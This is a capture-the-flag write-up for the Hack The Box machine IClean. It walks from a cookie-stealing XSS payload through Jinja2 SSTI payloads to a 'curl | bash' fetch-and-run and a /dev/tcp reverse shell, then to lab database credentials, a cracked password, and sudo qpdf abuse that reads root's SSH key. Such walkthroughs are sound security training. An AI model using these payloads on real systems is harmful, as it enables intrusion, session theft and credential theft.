IClean begins with a cleaning service website where we identify a form vulnerable to Cross-Site Scripting (XSS). Exploiting this vulnerability, we retrieve a session cookie and access the application dashboard. There, we discover an invoice generator susceptible to Server-Side Template Injection (SSTI), which provides our initial foothold. Further exploration reveals the database credentials, allowing us to recover password hashes. By cracking one of these hashes, we gain SSH access and retrieve the user flag. To obtain the root flag, we must exploit qpdf, and this write-up will demonstrate two different methods to achieve this.

```

We find two open ports 22 (SSH) and 80 (HTTP - Apache)

We get redirected to `capiclean.htb` when trying to access the web server. We need to add it to the `/etc/hosts` file to access the website.

```
sudo echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The web application is a cleaning service. 

![IClean website](/images/HTB-IClean/capiclean.png)

After looking around we found two functionalities that we may be able to exploit. 

* `http://capiclean.htb/quote` (using the `GET A QUOTE` button) leads us to a form where we can select which services we desire and also input an email address.

![capiclean quote](/images/HTB-IClean/capiclean-quote.png)

After submitting an email address we get to `http://capiclean.htb/sendMessage`.

![capiclean quote thank you message](/images/HTB-IClean/capiclean-quote2.png)

* `http://capiclean.htb/login` leads to a login form with the usual username:password credentials.

![capiclean login](/images/HTB-IClean/capiclean-login.png)

Running gobuster we find  `/dashboard` but we get redirected to the Home page when we try to access it probably because we don't have a valid cookie.

```
gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![directory brute forcing](/images/HTB-IClean/gobuster.png)

We intercept the request we get after submitting the email at `/quote`, since there is a login feature but no sign in it button let's try to steal a session cookie in order to gain access the other pages.

![Request intercepted](/images/HTB-IClean/quote-request.png)

Now we use our payload before sending the request.

![XSS cookie steal](/images/HTB-IClean/XSS-cookie-steal.png)

**XSS Payload**

```
<img+src%3dx+onerror%3dthis.src%3d"http%3a//<IP_ADDRESS>%3a<PORT_NUMBER>/cookie.php"%2bbtoa(document.cookie)>
```

We get the base64 cookie value.

![base64 cookie value](/images/HTB-IClean/base64-cookie.png)

**Base64 cookie value**

```

```

We use the command below to decode it.

```
echo 'COOKIE_VALUE' | base64 -d
```

![cookie value decoded](/images/HTB-IClean/COOKIE-value.png)

After adding it to our browser, we are able to access `/dashboard`.

![IClean dashboard](/images/HTB-IClean/capiclean-dashboard.png)

In `Generate Invoice`  we can fill the form and get an `Invoice ID`.

![IClean invoice generator](/images/HTB-IClean/invoice-generator.png)

![IClean invoice ID](/images/HTB-IClean/Invoice-ID.png)

Using that ID in `Generate QR` will create a QR code link, submitting that link allows us to see our invoice document.

![IClean Generate QR code](/images/HTB-IClean/Generate-QR.png)

![IClean Invoce document](/images/HTB-IClean/Invoice-doc.png)

## Initial Foothold

The application is clearly using some template engine to create the invoice documents which means it might be vulnerable to `Server Side Template Injection (SSTI)`. The thing is we need to find which template engine is being used.

Using `Wappalyzer` I identify that the application is using `Flask` and we know that the commonly used template engines for Python are Jinja2, Mako, Genshi and Cheetah.

![IClean wapplayzer](/images/HTB-IClean/wappalyzer.png)

This [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) page has various payloads to test for SSTI and identify the specific template used.

We confirm that `Jinja2` is being used by using the payload `{{config}}` which returns the server's configuration. Now we just need to find the right payload to execute our commands on the server.

![SSTI test](/images/HTB-IClean/SSTI-test.png)

![SSTI test results](/images/HTB-IClean/SSTI-test2.png)

After numerous fails I found a working payload on [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses).

```
{%25with+a%3drequest|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%25}{%25print(a)%25}{%25endwith%25}
```

![SSTI payload](/images/HTB-IClean/SSTI-payload.png)

The next step is to prompt the server to run our reverse shell. To do this, weâ€™ll establish a Python server on our local machine and set up a listener on a port of our choosing. This will allow us to receive incoming connections from the reverse shell.

Below is the content of my reverse shell file.

```
#!/bin/bash

sh -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1
```

> The reverse shell is inside the `revshell.sh` file. After we send the request containing our payload, the server fetches it from our python server and executes it. 

```
{%25with+a%3drequest|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl+http%3a//<IP_ADDRESS>%3a<PORT_NUMBER>/revshell.sh+|+bash')|attr('read')()%25}{%25print(a)%25}{%25endwith%25}
```

We get a shell as `www-data`.

## Privilege Escalation

In `/home` we are unable to access the directory `consuela`.

![IClean access denied](/images/HTB-IClean/consuella-denied.png)

Looking around we find some database credentials  in `opt/app/app.py`.

![IClean database credentials](/images/HTB-IClean/db-credentials.png)

After running `ss -lntp` we see a service running on port 3306 which is `MySQL` default port. 

![IClean internal services](/images/HTB-IClean/services.png)

We connect to the database with `iclean:pxCsmnGLckUb`

```
mysql -u iclean -p
```

In the `capiclean` database we find a table called `users` which contains the password hash for the  user `consuela`.

![IClean database users table](/images/HTB-IClean/users-table.png)

Using [crackstation](https://crackstation.net/) we get the user password which is `simple and clean`.

![password hash cracked](/images/HTB-IClean/hash-cracked.png)

> The spaces are also part of the password.

With the credentials `consuela:simple and clean` we login via SSH and retrieve the user flag `user.txt`

![user flag](/images/HTB-IClean/user-flag.png)

`sudo -l` reveals that the user can run `/usr/bin/qpdf` as root. 

![sudo -l command](/images/HTB-IClean/sudo-l.png)

Going through the documentation for [qpdf](https://qpdf.readthedocs.io/en/stable/cli.html#option-add-attachment) we find that `--add-attachment` can be used to add attachments to a file. 

From here we have two ways to get the root flag. We can grab the root SSH key by attaching it to a pdf file and login as the root user or we can directly attach the root flag (because it is simply a .txt file) to a pdf file, open it in a document viewer and read the flag.

### First method

First we attach the SSH key for the root user to a pdf file, connect as the root user via SSH and grab the root flag. 

```
sudo /usr/bin/qpdf --empty /tmp/root.pdf --qdf --add-attachment /root/.ssh/id_rsa --
```

The SSH key is in the output of the file. We only need to do `cat root.pdf` to get the SSH private key for the root user.

![root ssh key](/images/HTB-IClean/root-ssh-key.png)

We copy it to our local machine and make sure to change the permission with `chmod 600`. We can then login as root via ssh.

```
ssh root@capiclean.htb -i id_rsa
```

![root flag](/images/HTB-IClean/root-flag.png)


### Second method

For this method we upload a dummy pdf on the target and we attach the root flag to it.

```
sudo /usr/bin/qpdf --add-attachment /root/root.txt -- dummy.pdf root2.pdf
```

We download the output file `root2.pdf` in this example. I used the default document viewer on my Kali VM. Click on the scrolling menu in the upper-left corner and choose `Attachments`.

![PDF Viewer Attachments](/images/HTB-IClean/pdf-attachment.png)

Double click `root.txt` and it will reveal the root flag.
